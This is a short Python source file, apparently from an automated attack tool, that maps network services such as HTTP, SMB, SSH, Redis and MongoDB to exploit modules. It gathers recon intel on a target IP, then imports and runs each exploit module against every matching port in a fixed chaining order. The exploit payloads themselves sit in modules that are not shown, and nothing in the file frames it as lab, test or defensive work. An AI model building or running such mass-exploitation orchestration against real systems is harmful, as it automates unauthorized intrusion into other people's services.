# exploit/auto_exploit.py
import importlib
from recon.intel import full_intel

# Mapping from service to exploit module
SERVICE_EXPLOITS = {
    'http': 'modules.http',
    'https': 'modules.http',
    'ftp': 'modules.ftp',
    'ssh': 'modules.ssh',
    'mysql': 'modules.mysql',
    'smb': 'modules.smb',
    'telnet': 'modules.telnet',
    'vnc': 'modules.vnc',
    'redis': 'modules.redis',
    'postgresql': 'modules.postgresql',
    'mongodb': 'modules.mongodb',
}

# Payload chaining priority
CHAIN_ORDER = [
    'http', 'ftp', 'smb', 'mysql', 'ssh', 'telnet', 'redis', 'postgresql', 'mongodb'
]

def run_exploit(ip, ports_services):
    print(f"[ðŸŽ¯] Running exploit sequence on {ip}...")
    intel = full_intel(ip)
    print(f"[ðŸ§  INTEL] {intel}")

    for service in CHAIN_ORDER:
        ports = [port for port, s in ports_services.items() if s == service]
        if not ports:
            continue

        if service in SERVICE_EXPLOITS:
            try:
                exploit_module = importlib.import_module(SERVICE_EXPLOITS[service])
                print(f"[ðŸ’¥] Attempting {service.upper()} exploit on ports: {ports}...")
                for port in ports:
                    exploit_module.run(ip, port, intel)
            except Exception as e:
                print(f"[!] Exploit failed on {service}: {e}")

    print("[âœ“] Exploitation attempt finished.")
